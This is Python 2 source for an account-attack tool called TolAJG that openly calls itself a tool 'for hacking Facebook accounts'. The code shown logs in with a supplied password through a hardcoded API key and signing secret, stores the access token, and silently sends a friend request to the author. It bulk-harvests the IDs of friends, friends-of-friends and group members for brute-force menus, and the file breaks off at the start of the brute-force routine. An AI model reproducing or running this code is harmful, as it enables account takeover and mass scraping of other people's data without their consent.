import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91m[!] Exit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def run(a):
    for m in a + '\n':
        sys.stdout.write(m)
        sys.stdout.flush()
        time.sleep(0.01)


___maestro__ = '\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[1;97m\n'

def tik():
    titik = [
     './   ', '..\\  ', '.../ ', '....\\ ', '...../ ', '......\\ ', '....../']
    for o in titik:
        print '\r\x1b[1;97m[+] \x1b[1;97mLoading \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
gagal = []
idteman = []
idfromteman = []
idmem = []
emmem = []
nomem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def sapa():
    os.system('reset')
    run('\n\tprint "\x1b[41;1;33m Hello...\x1b[0;0m"\n\t\x1b[1;91m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\t\x1b[1;91m\xe2\x95\x91\x1b[1;96mSelamat datang di TolAJG versi kedua (2.0).    \n\t\x1b[1;91m\xe2\x95\x91\x1b[1;96mTool Ini Khusus Untuk Meretas Akun Facebook   \n\t\x1b[1;91m\xe2\x95\x91\x1b[1;96mDan Pada Versi pertama ini masih belum banyak\n\t\x1b[1;91m\xe2\x95\x91\x1b[1;96mFitur nya tapi jika banyak yang suka dengan Tool\n\t\x1b[1;91m\xe2\x95\x91\x1b[1;96mini saya akan membuat versi selanjutnya dan \n\t\x1b[1;91m\xe2\x95\x91\x1b[1;96mMenambahkan beberapa fitur lagi. \n\t\x1b[1;91m\xe2\x95\x91\x1b[1;96mOke trima kasih Atas Perhatiannya! \n\t\x1b[1;91m\xe2\x95\x91\x1b[1;93m#Author : Maestro Alvardo \n\t\x1b[1;91m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\t')
    raw_input('\nPress Any to Continue....')
    lisensu()


def login():
    os.system('reset')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('reset')
        print ___maestro__
        run("[!]Please Log'out Your Account First from App Mobile and \n    Your Log'in in Opera Mini\n")
        print '\x1b[1;97m[+]Login Facebook Account!'
        id = raw_input('\x1b[1;97m[?]Username : ')
        pwd = getpass.getpass('\x1b[1;97m[?]Password : ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] No connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n\x1b[1;97mLogin Succesfully'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                lisensu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] No connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;91m[!] Login Failed'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def tokenz():
    os.system('reset')
    print ___maestro__
    toket = raw_input('\x1b[1;91m[?] \x1b[1;92mToken\x1b[1;91m : \x1b[1;97m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        menu()
    except KeyError:
        print '\x1b[1;91m[!] Wrong'
        e = raw_input('\x1b[1;91m[?] \x1b[1;92mWant to pick up token?\x1b[1;97m[y/n]: ')
        if e == '':
            keluar()
        elif e == 'y':
            login()
        else:
            keluar()


def lisensu():
    os.system('reset')
    run('\n\t     \x1b[41;1;33m[      Info Tools     ]\x1b[0;0m\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m(=====\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m \t\t\t \x1b[1;97m\n')
    run('\x1b[1;91m+\x1b[1;92m---------------------------------------------------\x1b[1;91m+')
    run('\x1b[1;91m+\x1b[1;96m       TolAJGv1.0 For Hacking Facebook Account     \x1b[1;91m+')
    run("\x1b[1;91m+ \x1b[1;96m      it's Work.                                  \x1b[1;91m+")
    run('\x1b[1;91m+\x1b[1;92m---------------------------------------------------\x1b[1;91m+')
    run('\x1b[1;93m------------------------------------------------------')
    run('\x1b[1;91m[\x1b[1;96m+\x1b[1;91m]\x1b[1;96mReal Password \x1b[1;97m : \x1b[1;92mContact Author')
    run('\x1b[1;91m[\x1b[1;96m+\x1b[1;91m]\x1b[1;96mTrial Password \x1b[1;97m: \x1b[41;1;34mTolAJG\x1b[0;0m')
    run("\x1b[1;91m[\x1b[1;96m+\x1b[1;91m]\x1b[1;96mMessage    \x1b[1;97m    :\x1b[1;91m Don't Usage in Tool For")
    run('                    Criminals')
    run('\x1b[1;93m------------------------------------------------------')
    du()


def du():
    passw = raw_input('\x1b[1;91m[\x1b[1;93m!\x1b[1;91m]\x1b[1;92mInput License:\x1b[1;96m ')
    r = requests.get('https://friendcyber.000webhostapp.com/pas.txt').text
    if passw == '':
        print 'Wrong'
        du()
    elif passw == 'TolAJG':
        trial()
    elif len(passw) < 10:
        print 'Wrong'
        du()
    elif passw in r:
        print 'Succesfully!'
        time.sleep(1)
        menu()
    else:
        print 'Wrong'
        du()


def menu():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
        except KeyError:
            os.system('reset')
            print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] No connection'
            keluar()

    os.system('reset')
    run('\n\t     \x1b[41;1;33m[      Info Tools     ]\x1b[0;0m\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m \t\t\t \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[1;97m\n')
    run('\x1b[1;91m+\x1b[1;92m---------------------------------------------------\x1b[1;91m+')
    run('\x1b[1;91m+\x1b[1;96m       TolAJGv1.0 For Hacking Facebook Account     \x1b[1;91m+')
    run("\x1b[1;91m+ \x1b[1;96m      it's Work.                                  \x1b[1;91m+")
    run('\x1b[1;91m+\x1b[1;92m---------------------------------------------------\x1b[1;91m+')
    run('\x1b[1;97m-----------------------------------------------------')
    run('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[41;1;33mYour Information\x1b[0;0m')
    run('\x1b[1;91m[\x1b[1;93m+\x1b[1;91m]\x1b[1;96mName\x1b[1;97m :\x1b[1;97m ' + nama)
    run('\x1b[1;91m[\x1b[1;93m+\x1b[1;91m]\x1b[1;96mID\x1b[1;97m   :\x1b[1;97m ' + id)
    run('\x1b[1;91m[\x1b[1;93m+\x1b[1;91m]\x1b[1;96mList \x1b[1;97m: \x1b[1;97mMember TolAJG')
    run('\x1b[1;97m-----------------------------------------------------')
    run('                                              \x1b[1;96m[\x1b[1;91m\xe2\x80\xa2\x1b[1;96m]\x1b[1;91mMenu')
    run('\x1b[1;97m[\x1b[1;96m1.\x1b[1;97m]\x1b[1;92mDump ID')
    run('\x1b[1;97m[\x1b[1;96m2.\x1b[1;97m]\x1b[1;92mAuto ButeForce')
    run('\x1b[1;97m[\x1b[1;96m3.\x1b[1;97m]\x1b[1;92mSuper Hack Facebook')
    run('\x1b[1;97m[\x1b[1;96m4.\x1b[1;97m]\x1b[1;92mYahoo Cloning')
    run('\x1b[1;97m[\x1b[1;96m77\x1b[1;97m]\x1b[1;93mContact Admin')
    run('\x1b[1;97m[\x1b[1;96m97\x1b[1;97m]\x1b[1;91mReport BUG')
    run('\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;97mExit')
    pilih()


def pilih():
    ndas = raw_input('\x1b[1;97m[\x1b[1;91m\xe2\x80\xa2 \x1b[1;96mTolAJG\x1b[1;91m \xe2\x80\xa2 \x1b[1;97m] : ')
    if ndas == '':
        print ndas + ' Not Found'
        pilih()
    elif ndas == '1':
        dump()
    elif ndas == '2':
        autombf()
    elif ndas == '3':
        super()
    elif ndas == '4':
        menu_yahoo()
    elif ndas == '77':
        cadmin()
    elif ndas == '00':
        os.system('rm -rf login.txt')
        keluar()


def dump():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print 'Login Facebook Account'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    run('\n\t     \x1b[41;1;33m[      Info Tools     ]\x1b[0;0m\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m \t\t\t \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[1;97m\n')
    run('+---------------------------------------------------+')
    run('+       TolAJGv1.0 For Hacking Facebook Account     +')
    run("+       it's Work.                                  +")
    run('+---------------------------------------------------+')
    run('                                      [\xe2\x80\xa2]Menu Dump ID:')
    run('[1.]Dump All ID Friend')
    run('[2.]Dump All ID From Friend')
    run('[3.]Dump ID From Member Grub')
    run('[00]Back')
    pil_dump()


def pil_dump():
    dump = raw_input('[\xe2\x80\xa2 TolAJG \xe2\x80\xa2] : ')
    if dump == '':
        print dump + ' Not Found'
        pil_dump()
    elif dump == '1':
        id_friend()
    elif dump == '2':
        idfrom_friend()
    elif dump == '3':
        id_member_grup()
    elif dump == '00':
        menu()
    else:
        print 'Lol'
        pil_dump()


def id_friend():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('ajg')
        except OSError:
            pass

        try:
            os.system('reset')
            run('\n\t     \x1b[41;1;33m[      Info Tools     ]\x1b[0;0m\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m \t\t\t \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[1;97m\n')
            run('[\xe2\x80\xa2]Dump All ID Friend')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            run('Get All ID Friend....')
            bz = open('ajg/id_friend.txt', 'w')
            for a in z['data']:
                idteman.append(a['id'])
                bz.write(a['id'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;96m' + str(len(idteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + a['id'],
                sys.stdout.flush()
                time.sleep(0.001)

            bz.close()
            run('\nSuccesfully')
            done = raw_input('Save File With : ')
            os.rename('ajg/id_friend.txt', 'ajg/' + done)
            run('File Saved : ajg/' + done)
            raw_input('Press Any to Continue....')
            menu()
        except IOError:
            print '\x1b[1;91m[!] Error creating file'
            raw_input('Press Any to Continue....')
            dump()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('Press Any to Continue....')
            dump()
        except KeyError:
            print '\x1b[1;91m[!] Error'
            raw_input('Press Any to Continue....')
            dump()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def idfrom_friend():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('ajg')
        except OSError:
            pass

        try:
            os.system('reset')
            run('\n\t     \x1b[41;1;33m[      Info Tools     ]\x1b[0;0m\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m \t\t\t \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[1;97m\n')
            idt = raw_input('\x1b[1;97m[-]Input ID Friend : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                run('[\xe2\x88\x9a]From : ' + op['name'])
            except KeyError:
                print '\x1b[1;91m[!] Friend not found'
                raw_input('\nPress Any to Continue....')
                dump()

            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
            z = json.loads(r.text)
            bz = open('ajg/id_from_friend.txt', 'w')
            for a in z['friends']['data']:
                idfromteman.append(a['id'])
                bz.write(a['id'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;97m' + str(len(idfromteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + a['id'],
                sys.stdout.flush()
                time.sleep(0.0001)

            bz.close()
            run('\rSuccesfully Get All ID From Friend')
            print '\r\x1b[1;97m[+]Total ID : %s' % len(idfromteman)
            done = raw_input('\r\x1b[1;97m[+] \x1b[1;97mSave file with name\x1b[1;97m :\x1b[1;97m ')
            os.rename('ajg/id_from_friend.txt', 'ajg/' + done)
            print '\r\x1b[1;97m[+] \x1b[1;97mFile saved \x1b[1;97m: \x1b[1;97majg/' + done
            raw_input('\nPress Any to Continue....')
            dump()
        except IOError:
            print '\x1b[1;91m[!] Error creating file'
            raw_input('\nPress Any to Continue....')
            dump()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\nPress Any to Continue....')
            dump()
        except KeyError:
            print '\x1b[1;91m[!] Error'
            raw_input('\nPress Any to Continue....')
            dump()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def id_member_grup():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('ajg')
        except OSError:
            pass

        try:
            os.system('reset')
            run('\n\t     \x1b[41;1;33m[      Info Tools     ]\x1b[0;0m\n\x1b[1;91m _____     _    _       _  ____\n|_   _|__ | |  / \\     | |/ ___|\n  | |/ _ \\| | / _ \\ _  | | |  _\n\x1b[1;97m  | | (_) | |/ ___ \\ |_| | |_| |\n  |_|\\___/|_/_/   \\_\\___/ \\____|\x1b[1;93m v2.0\n\x1b[1;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mAuthor \x1b[1;97m: \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mSupport\x1b[1;97m: \x1b[1;91mAnonymous\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mVersion\x1b[1;97m: \x1b[1;91mTolAJGv2.0.0\n\x1b[1;97m   [\x1b[1;92m\xe2\x9c\xa6\x1b[1;97m] \x1b[1;93mGithub \x1b[1;97m: \x1b[1;91mGithub.com/Maestro-Alvardo\n\x1b[1;96m \t\t\t \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\x1b[1;97m\n')
            id = raw_input('\x1b[1;97m[?]Input ID Grup : ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
                asw = json.loads(r.text)
                run('[\xe2\x88\x9a]Name Grup : ' + asw['name'])
            except KeyError:
                print '\x1b[1;91m[!] Group not found'
                raw_input('\nPress Any to Continue....')
                dump()

            bz = open('ajg/member_grup.txt', 'w')
            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
            s = json.loads(re.text)
            for a in s['data']:
                idmem.append(a['id'])
                bz.write(a['id'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;97m' + str(len(idmem)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + a['id'],
                sys.stdout.flush()
                time.sleep(0.0001)

            bz.close()
            run('[\xe2\x88\x9a]Succesfully Get All ID Member Grup')
            run('[+]Total ID : \x1b[1;97m%s' % len(idmem))
            done = raw_input('\r\x1b[1;97m[+] \x1b[1;97mSave file with name\x1b[1;97m :\x1b[1;97m ')
            os.rename('out/member_grup.txt', 'out/' + done)
            print '\r\x1b[1;97m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97majg/' + done
            raw_input('\nPress Any to Continue....')
            dump()
        except IOError:
            print '\x1b[1;91m[!] Error creating file'
            raw_input('\nPress Any to Continue....')
            dump()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\nPress Any to Continue....')
            dump()
        except KeyError:
            print '\x1b[1;91m[!] Error'
            raw_input('\nPress Any to Continue....')
            dump()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def autombf():
    global file
    global idlist
    global passw
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('reset')
